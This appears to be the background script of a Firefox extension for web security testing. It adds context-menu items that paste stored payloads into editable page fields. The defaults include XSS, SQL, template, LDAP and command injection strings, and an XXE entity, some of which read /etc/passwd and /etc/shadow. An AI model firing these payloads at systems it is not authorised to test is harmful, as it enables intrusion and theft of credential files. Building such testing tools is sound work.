let elem = 0
let defaults = {
  "payloads": [
    {"title": "XSS",
      "id": "xss",
      "payload": "<img src=1 onerror=alert()>"
    },
    {"title": "Simple quote SQLi",
      "id": "simple-sqli",
      "payload": "' or 1=1;-- "
    },
    {"title": "Double quote SQLi",
      "id": "double-sqli",
      "payload": "\" or 1=1;-- "
    },
    {"title": "Template Injection",
      "id": "template-injection",
      "payload": "${7*7}"
    },
    {"title": "XXE read file",
      "id": "xxe-read-file",
      "payload": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY read SYSTEM \"file:///etc/passwd\">]><root>&read;</root>"
    },
    {"title": "LDAP Injection",
      "id": "ldap",
      "payload": "*()|&'"
    },
    {"title": "Command injection",
      "id": "Command",
      "payload": "; cat /etc/shadow"
    }
  ]
}

let data = browser.storage.local.get("payloads")
data.then(onGot, onError);

function onGot(item) {
  if (JSON.stringify(item) === '{}'){
    console.log("got")
    browser.storage.local.set(defaults);
  } else {
    console.log("in")
    defaults = item
  }
}

function onError(error) {
  console.log(`Error: ${error}`);
}

for (vulnerability of defaults.payloads){
  browser.menus.create({
    id: vulnerability.id,
    title: vulnerability.title,
    documentUrlPatterns: ["*://*/*"],
    contexts: ["editable"],
  });
} 

browser.menus.onClicked.addListener((info, tab) => {
  console.log(defaults)
  for (vulnerability of defaults.payloads){
    if (vulnerability.id === info.menuItemId){
      if (vulnerability.payload.includes("'")){
        browser.tabs.executeScript(tab.id, {
          frameId: info.frameId,
          code: `elem = browser.menus.getTargetElement(${info.targetElementId});
          elem.value="` + vulnerability.payload + `"`,
        });
      } else {
        browser.tabs.executeScript(tab.id, {
          frameId: info.frameId,
          code: `elem = browser.menus.getTargetElement(${info.targetElementId});
          elem.value='` + vulnerability.payload + `'`,
        });
      }
      break
    }
  }
});